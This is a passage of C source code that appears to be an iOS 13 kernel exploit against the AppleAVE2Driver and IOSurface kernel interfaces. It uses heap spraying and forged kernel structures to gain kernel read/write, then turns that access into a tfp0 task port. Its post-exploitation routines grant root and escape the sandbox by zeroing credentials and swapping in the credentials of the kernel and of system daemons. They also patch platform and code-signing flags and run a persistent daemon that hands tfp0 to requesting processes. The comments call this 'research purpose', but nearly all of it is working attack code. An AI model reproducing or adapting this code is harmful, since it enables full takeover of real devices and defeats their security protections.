        // _pack_paveway is full, expanding the buf size
        _pack_paveway = realloc(_pack_paveway, sizeof(struct paveway_sprayAddrs_pack) * (_pack_pavewayCnt + 10));
    }
    
    (printf)("conti_seqno[0]: 0x%llx\n", conti_seqno[0]);
    (printf)("conti_seqno[1]: 0x%llx\n", conti_seqno[1]);
    
    uint64_t real_spray[3] = {0};
    real_spray[0] = conti_seqno[0];
    real_spray[1] = alloc_kernel_40_mem();
    real_spray[2] = conti_seqno[1];
    
    release_kernel_40_mem(real_spray[0]);
    release_kernel_40_mem(real_spray[1]);
    release_kernel_40_mem(real_spray[2]);
    
    (printf)("real_spray:\n");
    (printf)("  0: 0x%llx\n", real_spray[0]);
    (printf)("  1: 0x%llx\n", real_spray[1]);
    (printf)("  2: 0x%llx\n", real_spray[2]);
    
    uint32_t criticle_index = 10;
    
    TT1_send_spray();
    
    uint64_t criticle_records[10] = {0};
    uint64_t leaked_osdata = 0;
    for(int i=0; i<150; i++){
        uint64_t live_40buf = alloc_kernel_40_mem();
        if(i<criticle_index){
            criticle_records[i] = live_40buf;
        }
        
        if(i == criticle_index){
            // Interfering spray process while hopefully tend to begin showing stable output, so the desired address can stood-out
            TT1_send_spray();
            
            if(criticle_records[0] == criticle_records[2]){
                TT1_sprayid = TT1_sprayid - 1;
                leaked_osdata = real_spray[0];
            }
            else if(real_spray[2] == criticle_records[2]){
                if(real_spray[2] == criticle_records[8]){
                    leaked_osdata = real_spray[2];
                }
            }
            else{
                (printf)("NOTHING!!!!\n");
                //printf2("========== RE-Attemp ====\n");
                release_kernel_40_mem(live_40buf);
                leaked_osdata = hohoo();
                return leaked_osdata;
            }
        }
        
        if(i > criticle_index){
            if(leaked_osdata && leaked_osdata == live_40buf){
                // Target address been taken again, indicating was failure attempt, leaked_osdata is a false result
                (printf)("**** 0x%llx Target address been taken again, indicating that was failure attempt.. reattemping...\n", live_40buf);
                leaked_osdata = 0;
                i = 0;
            }
        }
        
        (printf)("spraymap: 0x%llx\n", live_40buf);
        release_kernel_40_mem(live_40buf);
    }
    
    return leaked_osdata;
}

uint32_t TT1_hit_holes[TT1_holes_count] = {0};
uint32_t TT1_hit_cnt = 0;

void hohoo222(){
    bzero(TT1_hit_holes, sizeof(TT1_hit_holes));
    TT1_hit_cnt = 0;
    
    uint64_t leaked_osdata = 0;
    while(1){
        leaked_osdata = hohoo();
        if(leaked_osdata)
            break;
    }
    
    TT2_send_spray();
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD701);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD751);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD7A1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD7F1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD841);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD891);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD8E1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD931);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD9D1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDA21);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDA71);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDAC1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDB11);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDB61);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDBB1);
    
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = leaked_osdata + 0x18;
    alloc_kernel_40_mem_contains_iosurfacebuf();
    empty_kernel_40_mem(leaked_osdata + 0x20);
    
    uint32_t confirm_TT1_sprayid = 0;
    uint8_t failure_case_all7 = 0;
    char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
    ccc = ccc + 0x10;
    confirm_TT1_sprayid = TT1_sprayid;
    for(int i=0; i<TT1_holes_count; i++){
        char *aaa = ccc + 0x80*i;
        
        if(i == 0){
            kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
            kObject_IOSurface = *(uint64_t*)(aaa+0x20);
        }
        
        (printf)("aaa: 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
        if(*(uint32_t*)(aaa+0x10) == 0x77777777){
            failure_case_all7 = 1;
            break;
        }
        if(*(uint32_t*)(aaa+0x10) == 0x66666666){
            uint32_t id = *(uint32_t*)(aaa+0x18);
            TT1_hit_holes[TT1_hit_cnt] = id;
            TT1_hit_cnt++;
            
        }
    }
    
    if(failure_case_all7 || (TT1_hit_cnt == 0)){
        failure_case_all7 = 0;
        confirm_TT1_sprayid = TT1_sprayid + 1;
        char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid + 1);
        ccc = ccc + 0x10;
        for(int i=0; i<TT1_holes_count; i++){
            char *aaa = ccc + 0x80*i;
            
            if(i == 0){
                kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
                kObject_IOSurface = *(uint64_t*)(aaa+0x20);
            }
            
            if(*(uint32_t*)(aaa+0x10) == 0x77777777){
                (printf)("aaa(+1): 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
                failure_case_all7 = 1;
                break;
            }
            if(*(uint32_t*)(aaa+0x10) == 0x66666666){
                uint32_t id = *(uint32_t*)(aaa+0x18);
                TT1_hit_holes[TT1_hit_cnt] = id;
                TT1_hit_cnt++;
            }
        }
        
        if(failure_case_all7 || (TT1_hit_cnt == 0))
        {
            failure_case_all7 = 0;
            confirm_TT1_sprayid = TT1_sprayid - 1;
            ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid - 1);
            ccc = ccc + 0x10;
            for(int i=0; i<TT1_holes_count; i++){
                char *aaa = ccc + 0x80*i;
                
                if(i == 0){
                    kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
                    kObject_IOSurface = *(uint64_t*)(aaa+0x20);
                }
                
                if(*(uint32_t*)(aaa+0x10) == 0x77777777){
                    (printf)("aaa(-1): 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
                    failure_case_all7 = 1;
                    break;
                }
                if(*(uint32_t*)(aaa+0x10) == 0x66666666){
                    uint32_t id = *(uint32_t*)(aaa+0x18);
                    TT1_hit_holes[TT1_hit_cnt] = id;
                    TT1_hit_cnt++;
                }
            }
        }
    }
    
    if(failure_case_all7 || (TT1_hit_cnt == 0)){
        (printf)("----(EMB) fallL!\n");
        hohoo222();
        return;
    }
    
    TT1_sprayid = confirm_TT1_sprayid;
}


void clean_up_everything(){
    for(int i=0; i<6; i++){
        remove_client();
    }
}


void prep_redirect_prev_clientbuf(uint64_t new_prev_clientbuf){
    for(int i=0; i<3; i++){
        *(uint64_t*)(inputmap_InitInfo + 147228) = new_prev_clientbuf; // 0x4000
        *(uint64_t*)(inputmap_InitInfo + 130844) = new_prev_clientbuf; // 0x8000
        *(uint64_t*)(inputmap_InitInfo + 114460) = new_prev_clientbuf; // 0xc000
    }
}

void prep_fake_clientbuf(uint64_t genuine_UserClient_kobj){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    uint64_t forge_clientbuf_kaddr = magic_addr + 0x24000;
    bzero(forge_clientbuf, 0x29B98);
    
    *(uint64_t*)(forge_clientbuf + 0x0) = genuine_UserClient_kobj;
    *(forge_clientbuf + 0x27B58) = 0x1;
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    uint64_t forge_KernelFrameQueue_kaddr = forge_clientbuf_kaddr + 0x29B98;
    bzero(forge_KernelFrameQueue, 24);
    *(uint64_t*)(forge_clientbuf + 0x27818) = forge_KernelFrameQueue_kaddr;
    
    char *forge_inputmap_FrameInfo = forge_KernelFrameQueue + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = forge_KernelFrameQueue_kaddr + 24;
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = forge_inputmap_FrameInfo_kaddr;
    
    *(uint32_t*)(forge_clientbuf + 0x8) = 0x0;
    *(forge_clientbuf + 0x27B59) = 0x0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 16) = 0x4569;
    *(uint32_t*)(forge_clientbuf + 0x4FF0 + 112) = 0x1;
    *(uint64_t*)(forge_clientbuf + 0x27838) = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
}

void clean_fake_clientbuf(){
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    bzero(forge_clientbuf, 0x29B98);
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    bzero(forge_KernelFrameQueue, 24);
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

void prep_fake_clientbuf_read(uint64_t genuine_UserClient_kobj){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    
    //clientbuf->enable_switch_one_SetSessionSettings // always 0
    *(forge_clientbuf + 0x27B59) = 0x1;
}



#pragma mark ---- Research Purpose ---- Basic for post-exp

extern char *Build_resource_path(char *filename);
extern int runCommand(const char *cmd, ...);
extern int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unrestrict)(pid_t));
#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);

void run_post_exp(){
    
    extern void safepatch_swap_unsandbox_and_root(uint64_t target_proc);
    extern void safepatch_unswap_unsandbox_and_root(uint64_t target_proc);
    
    // TODO with TFP0
    
    safepatch_swap_unsandbox_and_root(our_proc_kAddr);
    (printf)("now uid: %d\n", getuid());
    
    extern void build_tfp0_persistence_for_research_purpose(void);
    build_tfp0_persistence_for_research_purpose();
    extern void patch_codesign(void);
    patch_codesign();
    extern void move_in_jbResources(void);
    move_in_jbResources();
    safepatch_unswap_unsandbox_and_root(our_proc_kAddr);
    
}

#pragma mark ---- Research Purpose ---- Install tfp0-persis program

uint32_t OFFSET_bsd_info_p_ucred = 0x100;
uint32_t OFFSET_task_bsd_info = 0; // auto-gen: task->bsd_info

uint64_t KernelLeak_portAddr(uint64_t target_task, uint32_t portname){
    // Leak kernel ipc port stru address of the input port
    
    uint64_t leaked_port_stru_kAddr = 0;
    
    mach_port_t stored_ports[3] = {0};
    stored_ports[0] = mach_task_self();
    stored_ports[2] = portname;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    
    leaked_port_stru_kAddr = KernelRead_8bytes(target_task + OFFSET_task_itk_registered + 0x10);
    
    stored_ports[2] = 0;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    
    return leaked_port_stru_kAddr;
}

uint32_t KernelLeak_portAddr2(uint64_t target_task, uint64_t portStru){
    // Leak kernel ipc port stru address of the input port
    
    mach_port_t *stored_ports = NULL;
    mach_msg_type_number_t stored_portsCnt = 3;
    
    KernelWrite_8bytes(target_task + OFFSET_task_itk_registered + 0x10, portStru);
    
    mach_ports_lookup(mach_task_self(), &stored_ports, &stored_portsCnt);
    uint32_t rt_p = stored_ports[2];
    vm_deallocate(mach_task_self(), (vm_address_t)stored_ports, 4 * stored_portsCnt);
    return rt_p;
}

void patch_install_tfp0(uint64_t target_task, uint64_t safe_tfp0){
    KernelWrite_8bytes(target_task + OFFSET_task_itk_task_access, safe_tfp0);
}

void patch_remove_tfp0(uint64_t target_task){
    KernelWrite_8bytes(target_task + OFFSET_task_itk_task_access, 0);
}

mach_port_t patch_retrieve_tfp0(){
    tfp0_port = 0;
    task_get_special_port(mach_task_self(), TASK_ACCESS_PORT, &tfp0_port); // TASK_ACCESS_PORT is 8 in ios13 (for non-PAC), for PAC is 9
    return tfp0_port;
}

void patch_TF_PLATFORM(uint64_t target_task){
    uint32_t old_t_flags = KernelRead_4bytes(target_task + OFFSET_task_t_flags);
    old_t_flags |= 0x00000400; // TF_PLATFORM
    KernelWrite_4bytes(target_task + OFFSET_task_t_flags, old_t_flags);
    
    // used in kernel func: csproc_get_platform_binary
}

uint64_t ubc_cs_blob_get(uint64_t vp, int cputype, uint64_t offset){
    
    uint64_t uip = 0; // struct ubc_info *uip;
    uint64_t blob = 0;
    
    if ( vp && KernelRead_2bytes(vp + 112) == 1 && (uip = KernelRead_8bytes(vp + 120)) != 0 ){
        for (blob = KernelRead_8bytes(uip + 80); blob; blob = KernelRead_8bytes(blob)){
            if (cputype != -1 && KernelRead_4bytes(blob + 8) == cputype)
                break;
            if(offset != -1){
                uint64_t offset_in_blob = offset - KernelRead_8bytes(blob + 16);
                if(offset_in_blob >= KernelRead_8bytes(blob + 24) && offset_in_blob < KernelRead_8bytes(blob + 32))
                    break;
            }
        }
    }
    
    return blob;
}

void patch_CS_PLATFORM_BINARY(uint64_t target_proc){
    uint64_t p_textvp = KernelRead_8bytes(target_proc + 568); // confirmed same offsets on pac
    if(!p_textvp)
        return;
    uint64_t p_textoff = KernelRead_8bytes(target_proc + 576);
    uint64_t csblob = ubc_cs_blob_get(p_textvp, -1, p_textoff);
    if(csblob){
        KernelWrite_1byte(csblob + 168, 1); // csblob->csb_platform_binary
    }
}

void patch_unsandbox_and_root(uint64_t target_proc, bool patch_root){
    
    uint64_t proc_p_ucred = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    uint64_t p_ucred_obtain_rootAndUnsandbox = proc_p_ucred + 0x18;
    
    char *old_cred = calloc(1, 0x68);
    KernelRead_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    
    uint64_t old_cr_label = *(uint64_t*)(old_cred + 0x60);
    if(patch_root)
        bzero(old_cred, 0x68);
    
    (printf)("old_cr_label: 0x%llx\n", old_cr_label);
    if(old_cr_label){
        *(uint64_t*)(old_cred + 0x60) = old_cr_label;
        (printf)("old_cr_label+0: 0x%llx\n", KernelRead_8bytes(old_cr_label));
        (printf)("old_cr_label+0x8: 0x%llx\n", KernelRead_8bytes(old_cr_label + 0x8));
        (printf)("old_cr_label+0x10: 0x%llx\n", KernelRead_8bytes(old_cr_label + 0x10));
        KernelWrite_8bytes(old_cr_label+0x10, 0x0);
    }
    
    KernelWrite_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    free(old_cred);
}

char *old_cred = NULL;
uint64_t old_cr_label_content = 0;
void safepatch_swap_unsandbox_and_root(uint64_t target_proc){
    
    uint64_t proc_p_ucred = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    uint64_t p_ucred_obtain_rootAndUnsandbox = proc_p_ucred + 0x18;
    
    if(!old_cred){
        old_cred = calloc(1, 0x68);
    }
    KernelRead_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    char *tmp_cred = calloc(1, 0x68);
    memcpy(tmp_cred, old_cred, 0x68);
    
    uint64_t old_cr_label = *(uint64_t*)(old_cred + 0x60);
    bzero(tmp_cred, 0x68);
    
    if(old_cr_label){
        *(uint64_t*)(tmp_cred + 0x60) = old_cr_label;
        old_cr_label_content = KernelRead_8bytes(old_cr_label+0x10);
        KernelWrite_8bytes(old_cr_label+0x10, 0x0);
    }
    
    KernelWrite_anySize(p_ucred_obtain_rootAndUnsandbox, tmp_cred, 0x68);
    free(tmp_cred);
}

void safepatch_unswap_unsandbox_and_root(uint64_t target_proc){
    
    uint64_t proc_p_ucred = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    uint64_t p_ucred_obtain_rootAndUnsandbox = proc_p_ucred + 0x18;
    
    KernelWrite_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    
    uint64_t old_cr_label = *(uint64_t*)(old_cred + 0x60);
    if(old_cr_label){
        KernelWrite_8bytes(old_cr_label+0x10, old_cr_label_content);
    }
}

uint64_t myold_cred = 0;
void safepatch_swap_kernel_cred(uint64_t target_proc){
    
    uint64_t kernel_proc = find_proc_byPID(0);
    uint64_t kernel_p_ucred = KernelRead_8bytes(kernel_proc + OFFSET_bsd_info_p_ucred);
    
    myold_cred = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    KernelWrite_8bytes(target_proc + OFFSET_bsd_info_p_ucred, kernel_p_ucred);
}

void safepatch_unswap_kernel_cred(uint64_t target_proc){
    
    KernelWrite_8bytes(target_proc + OFFSET_bsd_info_p_ucred, myold_cred);
}

pid_t spindump_pid = 0;
uint64_t spindump_proc_cred = 0;
uint64_t myold_cred2 = 0;
void safepatch_swap_spindump_cred(uint64_t target_proc){
    
    if(spindump_proc_cred == 0){
        spindump_pid = 0;
        if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
            // if spindump is not running at moment
            if(fork() == 0){
                daemon(1, 1);
                close(STDIN_FILENO);
                close(STDOUT_FILENO);
                close(STDERR_FILENO);
                execvp("/usr/sbin/spindump", NULL);
                exit(1);
            }
            while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){}
        }
        kill(spindump_pid, SIGSTOP);
        uint64_t spindump_proc = find_proc_byPID(spindump_pid);
        spindump_proc_cred = KernelRead_8bytes(spindump_proc + OFFSET_bsd_info_p_ucred);
        
        uint64_t target_task = KernelRead_8bytes(target_proc + OFFSET_bsd_info_task);
        patch_TF_PLATFORM(target_task);
        // this is a must-patch in order to get task-mani api to work
    }
    
    myold_cred2 = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    KernelWrite_8bytes(target_proc + OFFSET_bsd_info_p_ucred, spindump_proc_cred);
}

void safepatch_unswap_spindump_cred(uint64_t target_proc){
    
    if(spindump_proc_cred){
        kill(spindump_pid, SIGCONT);
        kill(spindump_pid, SIGKILL);
        
        spindump_pid = 0;
        spindump_proc_cred = 0;
    }
    
    KernelWrite_8bytes(target_proc + OFFSET_bsd_info_p_ucred, myold_cred2);
}

pid_t containermanagerd_pid = 0;
uint64_t containermanagerd_proc_cred = 0;
uint64_t myold_cred3 = 0;
void safepatch_swap_containermanagerd_cred(uint64_t target_proc){
    
    if(containermanagerd_proc_cred == 0){
        containermanagerd_pid = 0;
        if(!(containermanagerd_pid = look_for_proc_basename("containermanagerd"))){
            // containermanagerd should always be runnning
        }
        uint64_t containermanagerd_proc = find_proc_byPID(containermanagerd_pid);
        containermanagerd_proc_cred = KernelRead_8bytes(containermanagerd_proc + OFFSET_bsd_info_p_ucred);
        
        uint64_t target_task = KernelRead_8bytes(target_proc + OFFSET_bsd_info_task);
        patch_TF_PLATFORM(target_task);
        // this is a must-patch in order to get task-mani api to work
    }
    
    myold_cred3 = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    KernelWrite_8bytes(target_proc + OFFSET_bsd_info_p_ucred, containermanagerd_proc_cred);
}

void safepatch_unswap_containermanagerd_cred(uint64_t target_proc){
    KernelWrite_8bytes(target_proc + OFFSET_bsd_info_p_ucred, myold_cred3);
}

void patch_root(uint64_t target_proc){
    
    uint64_t proc_p_ucred = KernelRead_8bytes(target_proc + OFFSET_bsd_info_p_ucred);
    uint64_t p_ucred_obtain_rootAndUnsandbox = proc_p_ucred + 0x18;
    
    char *old_cred = calloc(1, 0x68);
    KernelRead_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    
    uint64_t old_cr_label = *(uint64_t*)(old_cred + 0x60);
    bzero(old_cred, 0x68);
    
    if(old_cr_label){
        *(uint64_t*)(old_cred + 0x60) = old_cr_label;
    }
    
    KernelWrite_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    free(old_cred);
}

uint64_t leaked_MIDIServerPort_addr = 0;
uint64_t seek_out_proc_who_request_tfp0() {
    uint64_t proc = KernelRead_8bytes(kaslr + HARDCODED_allproc);
    
    for (int i=0; i < 50; i++) {
        // this loop start from the most recent new proc
        
        if(!proc)
            return 0;
        
        uint64_t task = KernelRead_8bytes(proc + 0x10);
        if(!task)
            goto continue_1;
        
        uint64_t task_accesport = KernelRead_8bytes(task + OFFSET_task_itk_registered + 0x10); // check last item in itk_registered
        if(!task_accesport || task_accesport != leaked_MIDIServerPort_addr)
            goto continue_1;
        
        // attach tfp0 port
        patch_install_tfp0(task, tfp0_portStru);
        
        // Awaiting util proc shown sign of took usage of tfp0
        while((task_accesport = KernelRead_8bytes(task + OFFSET_task_itk_registered + 0x10))){
        }
        
        // Remove the tfp0 pointer avoid dealloc problem
        patch_remove_tfp0(task);
        
        
    continue_1:
        proc = KernelRead_8bytes(proc);
    }
    return 0;
}

void build_tfp0_persistence_for_research_purpose(){
    
    pid_t child_pid = fork();
    if(child_pid == 0){
        daemon(1, 1);
        
        do{
            patch_retrieve_tfp0();
        }while(tfp0_port == 0);
        
        uint64_t child_proc = find_proc_byPID(getpid());
        uint64_t child_task = KernelRead_8bytes(child_proc + 0x10);
    
        mach_port_t midi_bsport = 0;
        extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
        bootstrap_look_up(bootstrap_port, "com.apple.midiserver", &midi_bsport);
        if(midi_bsport)
            leaked_MIDIServerPort_addr = KernelLeak_portAddr(child_task, midi_bsport);
        
        int old_v = 0;
        while(1){
            uint32_t midiserver_ref = KernelRead_4bytes(leaked_MIDIServerPort_addr + offsetof(struct ipc_port, ip_references));
            
            if(!old_v || old_v > midiserver_ref)
                old_v = midiserver_ref;
            
            if(midiserver_ref > old_v){
                old_v = midiserver_ref;
                
                seek_out_proc_who_request_tfp0();
            }
            
            sleep(1);
        }
        // shoud never reach here
    }
    
    uint64_t child_proc = find_proc_byPID(child_pid);
    uint64_t child_task = KernelRead_8bytes(child_proc + 0x10);
    patch_install_tfp0(child_task, tfp0_portStru);
}

#pragma mark ---- exp ---- Convert R/W prim to TFP0

void ios13_kernel_pwn(io_connect_t ioconn, io_connect_t surface_ioconn){
    
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    
    uint64_t InitInfo_map_addr = 0, InitInfo_map_size = 0;
    InitInfo_surfaceId = IOSurfaceRootUserClient_create_surface_map(surface_ioconn, &InitInfo_map_addr, (uint32_t*)&InitInfo_map_size);
    
    if(!InitInfo_surfaceId){
        (printf)("exp failed!\n");
        exit(1);
    }
    
    (printf)("InitInfo_surfaceId: 0x%x\n", InitInfo_surfaceId);
    Init_spraydata_for_TT1(InitInfo_surfaceId);
    Init_spraydata_for_TT2(InitInfo_surfaceId);
    
    uint64_t *remap_local_addr = 0;
    Send_overwritting_iosurfaceMap(InitInfo_map_addr, (uint64_t *)&remap_local_addr);
    
    inputmap_InitInfo = (char*)remap_local_addr;
    
    if(setjmp(reattempt_jmpb)){
        (printf)("RRRReatrmpe 9afioasf..\n");
        clean_up_everything();
    }
    
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    *(uint8_t*)(inputmap_InitInfo + 13377) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    {
        char input_stru[0x110] = {0};
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 220) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 224) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 228) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 232) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 236) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 240) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 244) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 248) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 48) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 52) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 56) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 60) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 64) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 68) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 72) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 76) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 80) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 84) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 88) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 92) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 96) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 100) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 104) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 108) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 112) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 116) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 120) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 124) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 128) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 132) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 136) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 140) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 144) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 148) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 152) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 156) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 160) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 164) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 168) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 172) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 176) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 180) = InitInfo_surfaceId;
        
        size_t output_stru_size = 4;
        char output_stru[4] = {0};
        for(int i=0; i<80; i++){
            IOConnectCallStructMethod(ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
        }
    }
    
    hohoo222();
    
    TT2_send_spray_smallspray(); // seal up remaining hols
    for(int i=0; i<TT1_hit_cnt; i++){
        uint32_t id = TT1_hit_holes[i];
        (printf)("hit holes id: 0x%x\n", id);
        IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, id);
    }
    
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    uint64_t spareone = alloc_kernel_40_mem_contains_iosurfacebuf();
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = spareone;
    remove_client();
    
    spray_client();
    char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
    ccc = ccc + 0x10;
    for(int i=0; i<TT1_holes_count; i++){
        char *aaa = ccc + 0x80*i;
        
        if(((*(uint64_t*)(aaa+0x10) == 0) || (*(uint64_t*)(aaa+0x10) == kObject_AppleAVE2Driver)) && (*(uint64_t*)(aaa+0x20) == kObject_IOSurface)){
            magic_addr = *(uint64_t*)(aaa+0x40);
            if(magic_addr)
                break;
        }
    }
    
    if(magic_addr == 0){
        do{
            add_new_client();
            spray_client();
            
            ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
            ccc = ccc + 0x10;
            for(int i=0; i<TT1_holes_count; i++){
                char *aaa = ccc + 0x80*i;
                
                if(((*(uint64_t*)(aaa+0x10) == 0) || (*(uint64_t*)(aaa+0x10) == kObject_AppleAVE2Driver)) && (*(uint64_t*)(aaa+0x20) == kObject_IOSurface)){
                    magic_addr = *(uint64_t*)(aaa+0x40);
                    if(magic_addr)
                        break;
                }
            }
            remove_client();
        }while(!magic_addr);
    }
    (printf)("magic_addr: 0x%llx\n", magic_addr);
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    prep_redirect_prev_clientbuf(magic_addr + 0x24000);
    
    add_new_client();
    TT2_release_all();
